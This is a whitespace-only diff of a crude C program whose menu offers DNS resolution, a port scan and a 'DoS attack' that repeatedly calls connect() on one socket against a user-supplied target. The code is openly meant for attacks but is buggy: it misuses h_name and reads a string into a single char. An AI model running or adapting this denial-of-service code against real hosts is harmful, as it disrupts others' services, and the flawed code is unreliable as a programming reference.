@@ -6,14 +6,12 @@
 #include <sys/socket.h>// uses to work with socket.
 #include <unistd.h>// uses to close the socket.
 
-
 // Resolves DNS.
 void DNSResolver(char *target)
 {
     struct hostent *targetDomain = gethostbyname(target);
     printf("IP: %s\n", inet_ntoa(*((struct in_addr *)targetDomain->h_name)));
 }
-
 //Port Scan.
 void PortScan(char *target)
 {
@@ -43,11 +41,9 @@ void PortScan(char *target)
         }
     }
 }
-
 // DOS to a target
 void DenialOfService(char *target,  int port)
-{
-    
+{ 
     int mySocket;
     mySocket = socket(AF_INET,SOCK_STREAM,0);
     int connectMySocket;
@@ -56,16 +52,13 @@ void DenialOfService(char *target,  int port)
     targetSocket.sin_addr.s_addr = inet_addr(target);
     targetSocket.sin_port = htons(port);
     
-    
     while (port != 0)
-
     {
    
         connectMySocket = connect(mySocket, (struct sockaddr *)&targetSocket, sizeof targetSocket);
         printf("The service is suffering DoS");
 
     }
-
 }
 
 void main (void)
@@ -73,12 +66,10 @@ void main (void)
    char target;
    int input;
    printf ("type 1 to DNS resolver, 2 to prot scan and 3 to DoNS attack ");
-   scanf("%i",&input);
-
-   
+   scanf("%i",&input);  
+  
    switch (input)
-    {
-        
+    {  
         case 1:
             printf("Type a target - eg: businesscorp.com.");
             scanf("%s",&target);
@@ -102,5 +93,4 @@ void main (void)
             printf("Please, you must type one number of menu");
             break;      
     }
-
 }
